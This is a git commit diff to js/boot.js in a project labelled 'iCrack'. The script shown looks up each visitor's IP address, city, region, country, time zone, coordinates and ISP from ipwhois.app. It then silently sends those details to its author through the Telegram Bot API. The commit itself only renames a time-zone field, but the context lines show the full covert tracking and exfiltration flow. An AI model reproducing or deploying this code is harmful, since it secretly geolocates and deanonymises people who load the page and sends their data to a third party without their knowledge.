3bfdb4ad2dde6090be859e1ae42fa27ba151c385
isumitfx <63400226+isumitfx@users.noreply.github.com>
2021-08-24 23:26:19 +0530

    Update boot.js

--- js/boot.js
+++ js/boot.js
@@ -7,7 +7,7 @@ const api_url = 'https://ipwhois.app/json/?objects=ip,country,region,city,latitu
 async function getISS() {
 	const response = await fetch(api_url);
 	const data = await response.json();
-	var my_text = `iCrack:%0A - IP Address: ${data.ip} %0A - City: ${data.city} %0A - State: ${data.region} %0A - Country: ${data.country} %0A - Time Zone: ${data.timezone} %0A - Latitude: ${data.latitude} %0A - Longitude: ${data.longitude} %0A - Internet Service Provider: ${data.isp} %0A - Organization: ${data.org}`
+	var my_text = `iCrack:%0A - IP Address: ${data.ip} %0A - City: ${data.city} %0A - State: ${data.region} %0A - Country: ${data.country} %0A - Time Zone: ${data.timezone_gmt} %0A - Latitude: ${data.latitude} %0A - Longitude: ${data.longitude} %0A - Internet Service Provider: ${data.isp} %0A - Organization: ${data.org}`
 
 	fetch(`https://api.telegram.org/bot${bot.TOKEN}/sendMessage?chat_id=${bot.chatID}&text=${my_text}`,{
 	method: "GET"
